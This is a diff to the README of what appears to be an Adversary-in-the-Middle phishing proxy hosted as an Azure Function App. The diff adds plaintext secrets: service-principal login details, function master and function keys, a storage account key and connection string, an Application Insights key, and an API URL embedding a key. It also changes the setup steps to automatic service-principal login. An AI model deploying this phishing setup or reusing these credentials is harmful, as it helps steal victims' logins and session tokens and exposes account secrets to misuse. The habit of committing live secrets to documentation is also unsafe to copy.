@@ -27,6 +27,13 @@ This is an Adversary-in-the-Middle (AiTM) phishing proxy implemented as an Azure
 - **Subscription Name**: "Azure subscription 1"
 - **Environment**: AzureCloud
 
+### Service Principal Credentials (AUTO-LOGIN)
+- **App ID**: `ef46029c-6f68-4cf7-a971-1a892452b956`
+- **Display Name**: `aitm-test-1753290092`
+- **Object ID**: `a463559a-0f89-45e2-bf7f-f45d6e5cd047`
+- **Type**: Service Principal
+- **Login Command**: `az login --service-principal -u ef46029c-6f68-4cf7-a971-1a892452b956 --tenant f544b97b-dab1-4bae-8114-c7dd29990284`
+
 ### Function App Details
 - **Function App Name**: `azureaitm-phishing-demo-1755253259`
 - **Resource Group**: `AzureAiTM-ResourceGroup`
@@ -43,6 +50,19 @@ This is an Adversary-in-the-Middle (AiTM) phishing proxy implemented as an Azure
 ### Publishing Credentials
 - **FTP URL**: `ftps://waws-prod-blu-249.ftp.azurewebsites.windows.net/site/wwwroot`
 - **Username**: `$azureaitm-phishing-demo-1755253259`
+
+### Function App Keys (API ACCESS)
+- **Master Key**: `Go64twSWFJO3nd0UiEG2kWOd5CwSqFF75ElglelXNZFJAzFuSEg6FA==`
+- **Function Key**: `44pyG40DaS9m0SmxglPxNPRs7E5zL5rNXXH3nyBqP7pTAzFuLp1sqA==`
+
+### Storage Account Credentials
+- **Account Name**: `azureaitmstorage123`
+- **Account Key**: `1i5QIqZ7bjFsADye+9kKsqhVm7L/fAq6WFYBMi/qglphsTsTq1DWh0ZydqQfMx2OoetoIaJENytJ+AStLN/XoA==`
+- **Connection String**: `DefaultEndpointsProtocol=https;EndpointSuffix=core.windows.net;AccountName=azureaitmstorage123;AccountKey=1i5QIqZ7bjFsADye+9kKsqhVm7L/fAq6WFYBMi/qglphsTsTq1DWh0ZydqQfMx2OoetoIaJENytJ+AStLN/XoA==`
+
+### Application Insights
+- **Instrumentation Key**: `e71a0bb1-de29-42e7-8712-856d27c3e019`
+- **Connection String**: `InstrumentationKey=e71a0bb1-de29-42e7-8712-856d27c3e019;IngestionEndpoint=https://eastus-8.in.applicationinsights.azure.com/;LiveEndpoint=https://eastus.livediagnostics.monitor.azure.com/;ApplicationId=02e3e413-7d4b-4ba9-bded-27af24eab88b`
 
 ## Telegram Bot Configuration
 
@@ -72,8 +92,8 @@ cd AzureAiTMFunction-main
 # Install dependencies
 npm install
 
-# Login to Azure
-az login
+# Login to Azure (AUTOMATIC)
+az login --service-principal -u ef46029c-6f68-4cf7-a971-1a892452b956 --tenant f544b97b-dab1-4bae-8114-c7dd29990284
 
 # Set subscription
 az account set --subscription 4e748793-333d-4c5e-acc4-7ce3fa17b136
@@ -91,6 +111,7 @@ az functionapp show --name azureaitm-phishing-demo-1755253259 --resource-group A
 ### Access the Function
 - **Main URL**: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net/`
 - **Phishing Function**: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net/{*x}`
+- **API Access**: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net/api/phishing?code=44pyG40DaS9m0SmxglPxNPRs7E5zL5rNXXH3nyBqP7pTAzFuLp1sqA==`
 
 ## Technical Architecture
 
